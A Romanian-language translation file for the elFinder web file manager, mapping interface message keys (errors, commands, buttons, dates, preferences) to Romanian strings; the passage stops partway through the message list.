/**
 * Română translation
 * @author Cristian Tabacitu <hello@tabacitu.ro>
 * @version 2022-03-03
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.ro = {
		translator : 'Cristian Tabacitu &lt;hello@tabacitu.ro&gt;',
		language   : 'Română',
		direction  : 'ltr',
		dateFormat : 'd M Y h:i', // will show like: 03 Mar 2022 11:15
		fancyDateFormat : '$1 h:i A', // will show like: Astăzi 11:15 AM
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220303-111529
		messages   : {
			'getShareText' : 'Acțiune',
			'Editor ': 'Editor de coduri',

			/********************************** errors **********************************/
			'error'                : 'Eroare',
			'errUnknown'           : 'Eroare necunoscută.',
			'errUnknownCmd'        : 'Comandă necunoscuta.',
			'errJqui'              : 'Configurație jQuery UI necunoscută. Componentele selectable, draggable și droppable trebuie să fie incluse.',
			'errNode'              : 'elFinder necesită ca DOM Element să fie creat.',
			'errURL'               : 'Configurație elFinder nevalidă! URL option nu este setat.',
			'errAccess'            : 'Acces interzis.',
			'errConnect'           : 'Nu ne-am putut conecta la backend.',
			'errAbort'             : 'Conexiunea a fost oprită.',
			'errTimeout'           : 'Conexiunea a fost întreruptă.',
			'errNotFound'          : 'Nu am gasit backend-ul.',
			'errResponse'          : 'Răspuns backend greșit.',
			'errConf'              : 'Configurație backend greșită.',
			'errJSON'              : 'Modulul PHP JSON nu este instalat.',
			'errNoVolumes'         : 'Volumele citibile nu sunt disponibile.',
			'errCmdParams'         : 'Parametri greșiți pentru comanda "$1".',
			'errDataNotJSON'       : 'Datele nu sunt în format JSON.',
			'errDataEmpty'         : 'Datele sunt goale.',
			'errCmdReq'            : 'Cererea către backend necesită un nume de comandă.',
			'errOpen'              : 'Nu am putut deschide "$1".',
			'errNotFolder'         : 'Obiectul nu este un dosar.',
			'errNotFile'           : 'Obiectul nu este un fișier.',
			'errRead'              : 'Nu am putut citi "$1".',
			'errWrite'             : 'Nu am putu scrie în "$1".',
			'errPerm'              : 'Nu ai permisiunea necesară.',
			'errLocked'            : '"$1" este blocat și nu poate fi redenumit, mutat sau șters.',
			'errExists'            : 'Un fișier cu numele "$1" există deja.',
			'errInvName'           : 'Numele pentru fișier este greșit.',
			'errInvDirname'        : 'Nume de folder nevalid.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Nu am găsit dosarul.',
			'errFileNotFound'      : 'Nu am găsit fișierul.',
			'errTrgFolderNotFound' : 'Nu am găsit dosarul pentru destinație "$1".',
			'errPopup'             : 'Browserul tău a prevenit deschiderea ferestrei popup. Pentru a deschide fișierul permite deschidere ferestrei.',
			'errMkdir'             : 'Nu am putut crea dosarul "$1".',
			'errMkfile'            : 'Nu am putut crea fișierul "$1".',
			'errRename'            : 'Nu am putut redenumi "$1".',
			'errCopyFrom'          : 'Copierea fișierelor de pe volumul "$1" este interzisă.',
			'errCopyTo'            : 'Copierea fișierelor către volumul "$1" este interzisă.',
			'errMkOutLink'         : 'Nu am putut crea linkul în afara volumului rădăcină.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Eroare de upload.',  // old name - errUploadCommon
			'errUploadFile'        : 'Nu am putut urca "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'Nu am găsit fișiere pentru a le urca.',
			'errUploadTotalSize'   : 'Datele depâșest limita maximă de mărime.', // old name - errMaxSize
			'errUploadFileSize'    : 'Fișierul este prea mare.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Acest tip de fișier nu este permis.',
			'errUploadTransfer'    : 'Eroare la transferarea "$1".',
			'errUploadTemp'        : 'Nu am putut crea fișierul temporar pentru upload.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Obiectul "$1" există deja în acest loc și nu poate fi înlocuit de un obiect de alt tip.', // new
			'errReplace'           : 'Nu am putut înlocui "$1".',
			'errSave'              : 'Nu am putut salva "$1".',
			'errCopy'              : 'Nu am putut copia "$1".',
			'errMove'              : 'Nu am putut muta "$1".',
			'errCopyInItself'      : 'Nu am putut copia "$1" în el însuși.',
			'errRm'                : 'Nu am putut șterge "$1".',
			'errTrash'             : 'Imposibil în coșul de gunoi.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Nu am putut șterge fișierul sursă.',
			'errExtract'           : 'Nu am putut extrage fișierele din "$1".',
			'errArchive'           : 'Nu am putut crea arhiva.',
			'errArcType'           : 'Arhiva este de un tip nesuportat.',
			'errNoArchive'         : 'Fișierul nu este o arhiva sau este o arhivă de un tip necunoscut.',
			'errCmdNoSupport'      : 'Backend-ul nu suportă această comandă.',
			'errReplByChild'       : 'Dosarul “$1” nu poate fi înlocuit de un element pe care el îl conține.',
			'errArcSymlinks'       : 'Din motive de securitate, arhiva nu are voie să conțină symlinks sau fișiere cu nume interzise.', // edited 24.06.2012
			'errArcMaxSize'        : 'Fișierul arhivei depășește mărimea maximă permisă.',
			'errResize'            : 'Nu am putut redimensiona "$1".',
			'errResizeDegree'      : 'Grad de rotație nevalid.',  // added 7.3.2013
			'errResizeRotate'      : 'Imaginea nu a fost rotită.',  // added 7.3.2013
			'errResizeSize'        : 'Mărimea imaginii este nevalidă.',  // added 7.3.2013
			'errResizeNoChange'    : 'Mărimea imaginii nu a fost schimbată.',  // added 7.3.2013
			'errUsupportType'      : 'Tipul acesta de fișier nu este suportat.',
			'errNotUTF8Content'    : 'Fișierul "$1" nu folosește UTF-8 și nu poate fi editat.',  // added 9.11.2011
			'errNetMount'          : 'Nu am putut încărca "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Protocol nesuportat.',     // added 17.04.2012
			'errNetMountFailed'    : 'Încărcare eșuată.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Gazda este necesară.', // added 18.04.2012
			'errSessionExpires'    : 'Sesiunea a expirat datorită lipsei de activitate.',
			'errCreatingTempDir'   : 'Nu am putut crea fișierul temporar: "$1"',
			'errFtpDownloadFile'   : 'Nu am putut descarca fișierul de pe FTP: "$1"',
			'errFtpUploadFile'     : 'Nu am putut încărca fișierul pe FTP: "$1"',
			'errFtpMkdir'          : 'Nu am putut crea acest dosar pe FTP: "$1"',
			'errArchiveExec'       : 'Eroare la arhivarea fișierelor: "$1"',
			'errExtractExec'       : 'Eroare la dezarhivarea fișierelor: "$1"',
			'errNetUnMount'        : 'Nu am putut elimina volumul', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Nu poate fi convertit la UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Pentru a urca dosare încearcă Google Chrome.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Timpul expirat în timpul căutării „$1”. Rezultatul căutării este parțial.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Este necesară reautorizarea.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Numărul maxim de articole selectabile este de 1 USD.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Nu se poate restabili din coșul de gunoi. Nu se poate identifica destinația de restaurare.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Editorul nu a fost găsit pentru acest tip de fișier.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'A apărut o eroare pe partea serverului.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Nu se poate goli folderul „$1”.', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Mai sunt erori de $1.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Puteți crea până la $1 foldere simultan.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Creeaza arhivă',
			'cmdback'      : 'Înapoi',
			'cmdcopy'      : 'Copiază',
			'cmdcut'       : 'Taie',
			'cmddownload'  : 'Descarcă',
			'cmdduplicate' : 'Creează duplicat',
			'cmdedit'      : 'Modifică fișier',
			'cmdextract'   : 'Extrage fișierele din arhivă',
			'cmdforward'   : 'Înainte',
			'cmdgetfile'   : 'Alege fișiere',
			'cmdhelp'      : 'Despre acest software',
			'cmdhome'      : 'Acasă',
			'cmdinfo'      : 'Informații',
			'cmdmkdir'     : 'Dosar nou',
			'cmdmkdirin'   : 'În folderul nou', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Fișier nou',
			'cmdopen'      : 'Deschide',
			'cmdpaste'     : 'Lipește',
			'cmdquicklook' : 'Previzualizează',
			'cmdreload'    : 'Reîncarcă',
			'cmdrename'    : 'Redenumește',
			'cmdrm'        : 'Șterge',
			'cmdtrash'     : 'În gunoi', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Restabili', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Găsește fișiere',
			'cmdup'        : 'Mergi la dosarul părinte',
			'cmdupload'    : 'Urcă fișiere',
			'cmdview'      : 'Vezi',
			'cmdresize'    : 'Redimensionează & rotește',
			'cmdsort'      : 'Sortează',
			'cmdnetmount'  : 'Încarcă volum din rețea', // added 18.04.2012
			'cmdnetunmount': 'Elimină volum', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'La Locuri', // added 28.12.2014
			'cmdchmod'     : 'Schimbă mod', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Deschide un folder', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Resetați lățimea coloanei', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Ecran complet', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Mișcare', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Goliți folderul', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Anula', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'A reface', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Preferințe', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Selectează tot', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Selectați niciunul', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Inverseaza selectia', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Deschide într-o fereastră nouă', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Ascunde (Preferință)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Închide',
			'btnSave'   : 'Salvează',
			'btnRm'     : 'Șterge',
			'btnApply'  : 'Aplică',
			'btnCancel' : 'Anulează',
			'btnNo'     : 'Nu',
			'btnYes'    : 'Da',
			'btnMount'  : 'Încarcă',  // added 18.04.2012
			'btnApprove': 'Mergi la $1 și aprobă', // from v2.1 added 26.04.2012
			'btnUnmount': 'Elimină volum', // from v2.1 added 30.04.2012
			'btnConv'   : 'Convertește', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Aici',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Volum',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Toate',       // from v2.1 added 22.5.2015
			'btnMime'   : 'Tipuri MIME', // from v2.1 added 22.5.2015
			'btnFileName':'Nume fișier',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Salvează și închide', // from v2.1 added 12.6.2015
			'btnBackup' : 'Backup', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Redenumiți',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Redenumiți(Toate)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Anterior ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Următorul ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Salvează ca', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Deschide dosar',
			'ntffile'     : 'Deschide fișier',
			'ntfreload'   : 'Actualizează conținutul dosarului',
			'ntfmkdir'    : 'Se creează dosarul',
			'ntfmkfile'   : 'Se creează fișierele',
			'ntfrm'       : 'Șterge fișiere',
			'ntfcopy'     : 'Copiază fișiere',
			'ntfmove'     : 'Mută fișiere',
			'ntfprepare'  : 'Pregătește copierea fișierelor',
			'ntfrename'   : 'Redenumește fișiere',
			'ntfupload'   : 'Se urcă fișierele',
			'ntfdownload' : 'Se descarcă fișierele',
			'ntfsave'     : 'Salvează fișiere',
			'ntfarchive'  : 'Se creează arhiva',
			'ntfextract'  : 'Se extrag fișierele din arhivă',
			'ntfsearch'   : 'Se caută fișierele',
			'ntfresize'   : 'Se redimnesionează imaginile',
			'ntfsmth'     : 'Se întamplă ceva',
			'ntfloadimg'  : 'Se încarcă imaginea',
			'ntfnetmount' : 'Se încarcă volumul din rețea', // added 18.04.2012
			'ntfnetunmount': 'Se elimină volumul din rețea', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Se preiau dimensiunile imaginii', // added 20.05.2013
			'ntfreaddir'  : 'Se citesc informațiile dosarului', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Se preia URL-ul din link', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Se schimba modul de fișier', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Se verifică numele fișierului de încărcare', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Crearea unui fișier pentru descărcare', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Obținerea informațiilor despre cale', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Se procesează fișierul încărcat', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Aruncă la gunoi', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Se efectuează restaurarea din coșul de gunoi', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Se verifică folderul de destinație', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Se anulează operația anterioară', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Se reface anularea anterioară', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Verificarea conținutului', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Gunoi', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'necunoscută',
			'Today'       : 'Astăzi',
			'Yesterday'   : 'Ieri',
			'msJan'       : 'Ian',
			'msFeb'       : 'Feb',
			'msMar'       : 'Mar',
			'msApr'       : 'Aprilie',
			'msMay'       : 'Mai',
			'msJun'       : 'Iun',
			'msJul'       : 'Iul',
			'msAug'       : 'aug',
			'msSep'       : 'sept',
			'msOct'       : 'oct',
			'msNov'       : 'nov',
			'msDec'       : 'Dec',
			'January'     : 'Ianuarie',
			'February'    : 'Februarie',
			'March'       : 'Martie',
			'April'       : 'Aprilie',
			'May'         : 'Mai',
			'June'        : 'Iunie',
			'July'        : 'Iulie',
			'August'      : 'August',
			'September'   : 'Septembrie',
			'October'     : 'Octombrie',
			'November'    : 'Noiembrie',
			'December'    : 'Decembrie',
			'Sunday'      : 'Duminică',
			'Monday'      : 'Luni',
			'Tuesday'     : 'Marți',
			'Wednesday'   : 'Miercuri',
			'Thursday'    : 'Joi',
			'Friday'      : 'Vineri',
			'Saturday'    : 'Sâmbătă',
			'Sun'         : 'Du',
			'Mon'         : 'Lu',
			'Tue'         : 'Ma',
			'Wed'         : 'Mi',
			'Thu'         : 'Jo',
			'Fri'         : 'Vi',
			'Sat'         : 'Sâ',

			/******************************** sort variants ********************************/
			'sortname'          : 'după nume',
			'sortkind'          : 'după tip',
			'sortsize'          : 'după mărime',
			'sortdate'          : 'după dată',
			'sortFoldersFirst'  : 'Dosarele primele',
			'sortperm'          : 'cu permisiunea', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'după mod',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'de catre proprietar',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'pe grupe',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'De asemenea, Treeview',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'FisierNou.txt', // added 10.11.2015
			'untitled folder'   : 'DosarNou',   // added 10.11.2015
			'Archive'           : 'ArhivaNoua',  // from v2.1 added 10.11.2015
			'untitled file'     : 'Fișier nou.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: Fișier',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Este necesară confirmare',
			'confirmRm'       : 'Ești sigur că vrei să ștergi fișierele?<br/>Acțiunea este ireversibilă!',
			'confirmRepl'     : 'Înlocuiește fișierul vechi cu cel nou?',
			'confirmRest'     : 'Înlocuiți elementul existent cu articolul din coșul de gunoi?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Nu este în UTF-8<br/>Convertim la UTF-8?<br/>Conținutul devine UTF-8 după salvarea conversiei.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Codificarea caracterelor acestui fișier nu a putut fi detectată. Trebuie să se convertească temporar în UTF-8 pentru editare.<br/>Selectați codificarea caracterelor pentru acest fișier.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Au avut loc modificări.<br/>Dacă nu salvezi se vor pierde modificările.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Sigur doriți să mutați articolele în coșul de gunoi?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Sigur doriți să mutați articole în „$1”?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Aplică pentru toate',
			'name'            : 'Nume',
			'size'            : 'Mărime',
			'perms'           : 'Permisiuni',
			'modify'          : 'Modificat la',
			'kind'            : 'Tip',
			'read'            : 'citire',
			'write'           : 'scriere',
			'noaccess'        : 'acces interzis',
			'and'             : 'și',
			'unknown'         : 'necunoscut',
			'selectall'       : 'Alege toate fișierele',
			'selectfiles'     : 'Alege fișier(e)',
			'selectffile'     : 'Alege primul fișier',
			'selectlfile'     : 'Alege ultimul fișier',
			'viewlist'        : 'Vezi ca listă',
			'viewicons'       : 'Vezi ca icoane',
			'viewSmall'       : 'Pictograme mici', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Pictograme medii', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Pictograme mari', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Pictograme foarte mari', // from v2.1.39 added 22.5.2018
			'places'          : 'Locuri',
			'calc'            : 'Calculează',
			'path'            : 'Cale',
			'aliasfor'        : 'Alias pentru',
			'locked'          : 'Securizat',
			'dim'             : 'Dimensiuni',
			'files'           : 'Fișiere',
			'folders'         : 'Dosare',
			'items'           : 'Elemente',
			'yes'             : 'da',
			'no'              : 'nu',
			'link'            : 'Legătură',
			'searcresult'     : 'Rezultatele căutării',
			'selected'        : 'elemente alese',
			'about'           : 'Despre',
			'shortcuts'       : 'Scurtături',
			'help'            : 'Ajutor',
			'webfm'           : 'Manager web pentru fișiere',
			'ver'             : 'Versiune',
			'protocolver'     : 'versiune protocol',
			'homepage'        : 'Pagina proiectului',
			'docs'            : 'Documentație',
			'github'          : 'Fork nou pe Github',
			'twitter'         : 'Urmărește-ne pe twitter',
			'facebook'        : 'Alătura-te pe facebook',
			'team'            : 'Echipa',
			'chiefdev'        : 'dezvoltator șef',
			'developer'       : 'dezvoltator',
			'contributor'     : 'contribuitor',
			'maintainer'      : 'întreţinător',
			'translator'      : 'traducător',
			'icons'           : 'Icoane',
			'dontforget'      : 'și nu uita să-ți iei prosopul',
			'shortcutsof'     : 'Scurtăturile sunt dezactivate',
			'dropFiles'       : 'Dă drumul fișierelor aici',
			'or'              : 'sau',
			'selectForUpload' : 'Alege fișiere pentru a le urca',
			'moveFiles'       : 'Mută fișiere',
			'copyFiles'       : 'Copiază fișiere',
			'restoreFiles'    : 'Restaurați articolele', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Șterge din locuri',
			'aspectRatio'     : 'Raportul de aspect',
			'scale'           : 'Scală',
			'width'           : 'Lățime',
			'height'          : 'Înălțime',
			'resize'          : 'Redimensionează',
			'crop'            : 'Decupează',
			'rotate'          : 'Rotește',
			'rotate-cw'       : 'Rotește cu 90° în sensul ceasului',
			'rotate-ccw'      : 'Rotește cu 90° în sensul invers ceasului',
			'degree'          : '°',
			'netMountDialogTitle' : 'Încarcă volum din rețea', // added 18.04.2012
			'protocol'            : 'Protocol', // added 18.04.2012
			'host'                : 'Gazdă', // added 18.04.2012
			'port'                : 'Port', // added 18.04.2012
			'user'                : 'Utilizator', // added 18.04.2012
			'pass'                : 'Parolă', // added 18.04.2012
			'confirmUnmount'      : 'Vrei să elimini volumul $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Drag&drop sau lipește din browser', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Drag&drop sau lipește fișiere aici', // from v2.1 added 07.04.2014
			'encoding'        : 'Encodare', // from v2.1 added 19.12.2014
			'locale'          : 'Locale',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Țintă: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Caută după tipul MIME', // from v2.1 added 22.5.2015
			'owner'           : 'Proprietar', // from v2.1 added 20.6.2015
			'group'           : 'grup', // from v2.1 added 20.6.2015
			'other'           : 'Alte', // from v2.1 added 20.6.2015
			'execute'         : 'A executa', // from v2.1 added 20.6.2015
			'perm'            : 'Permisiune', // from v2.1 added 20.6.2015
			'mode'            : 'Mod', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Folderul este gol', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Folderul este gol\\A Drop pentru a adăuga elemente', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Dosarul este gol\\A Atingeți lung pentru a adăuga elemente', // from v2.1.6 added 30.12.2015
			'quality'         : 'Calitate', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Auto-sincronizare',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Mișcă-te în sus',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Obțineți linkul URL', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Articole selectate ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID dosar', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Permite accesul offline', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Pentru a se re-autentifica', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Acum se încarcă...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Deschideți mai multe fișiere', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Încercați să deschideți fișierele $1. Sigur doriți să deschideți în browser?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Rezultatele căutării sunt goale în ținta de căutare.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Este editarea unui fișier.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Ați selectat articole de 1 USD.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Aveți articole de 1 USD în clipboard.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Căutarea incrementală este numai din vizualizarea curentă.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Reintroduceți', // from v2.1.15 added 3.8.2016
			'complete'        : '1 dolar complet', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Meniul contextual', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Întoarcerea paginii', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Rădăcini de volum', // from v2.1.16 added 16.9.2016
			'reset'           : 'Resetează', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Culoare de fundal', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Selector de culoare', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : 'Grilă 8px', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Activat', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Dezactivat', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Rezultatele căutării sunt goale în vizualizarea curentă.\\APăsați [Enter] pentru a extinde ținta de căutare.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Rezultatele căutării cu prima literă sunt goale în vizualizarea curentă.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Etichetă text', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '1 $ min. rămase', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Redeschideți cu codificarea selectată', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Salvați cu codificarea selectată', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Selectați folderul', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Căutare prima literă', // from v2.1.23 added 24.3.2017
			'presets'         : 'Presetări', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Sunt prea multe articole, așa că nu pot fi la gunoi.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'TextArea', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Goliți folderul „$1”.', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Nu există elemente într-un folder „$1”.', // from v2.1.25 added 22.6.2017
			'preference'      : 'Preferinţă', // from v2.1.26 added 28.6.2017
			'language'        : 'Limba', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Inițializați setările salvate în acest browser', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Setările barei de instrumente', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... $1 caractere rămase.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... 1 $ linii rămase.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Sumă', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Dimensiunea aspră a fișierului', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Concentrați-vă pe elementul de dialog cu mouseover',  // from v2.1.30 added 2.11.2017
			'select'          : 'Selectați', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Acțiune când selectați fișierul', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Deschideți cu editorul folosit ultima dată', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Inverseaza selectia', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Sigur doriți să redenumiți $1 elementele selectate, cum ar fi $2?<br/>Acest lucru nu poate fi anulat!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Redenumirea lotului', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Număr', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Adăugați prefix', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Adăugați sufix', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Schimbați extensia', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Setări coloane (vizualizare listă)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Toate modificările se vor reflecta imediat în arhivă.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Orice modificare nu se va reflecta până când nu demontați acest volum.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Următoarele volume montate pe acest volum au fost, de asemenea, demontate. Ești sigur că o demontați?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Informații de selecție', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algoritmi pentru a afișa hash-ul fișierului', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Elemente de informații (panoul de informații de selecție)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Apăsați din nou pentru a ieși.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Bara de instrumente', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Spațiu de lucru', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Dialog', // from v2.1.38 added 4.4.2018
			'all'             : 'Toate', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Dimensiunea pictogramei (vizualizarea pictogramelor)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Deschideți fereastra editorului maximizat', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Deoarece conversia prin API nu este disponibilă în prezent, vă rugăm să efectuați conversia pe site.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'După conversie, trebuie să fiți încărcat cu adresa URL a articolului sau cu un fișier descărcat pentru a salva fișierul convertit.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Convertiți pe site-ul de $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Integrari', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Acest elFinder are următoarele servicii externe integrate. Vă rugăm să verificați termenii de utilizare, politica de confidențialitate etc. înainte de a o utiliza.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Afișează elementele ascunse', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Ascunde elementele ascunse', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Afișează/Ascunde elementele ascunse', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Tipuri de fișiere de activat cu „Fișier nou”', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Tipul fișierului text', // from v2.1.41 added 7.8.2018
			'add'             : 'Adăuga', // from v2.1.41 added 7.8.2018
			'theme'           : 'Temă', // from v2.1.43 added 19.10.2018
			'default'         : 'Mod implicit', // from v2.1.43 added 19.10.2018
			'description'     : 'Descriere', // from v2.1.43 added 19.10.2018
			'website'         : 'Site-ul web', // from v2.1.43 added 19.10.2018
			'author'          : 'Autor', // from v2.1.43 added 19.10.2018
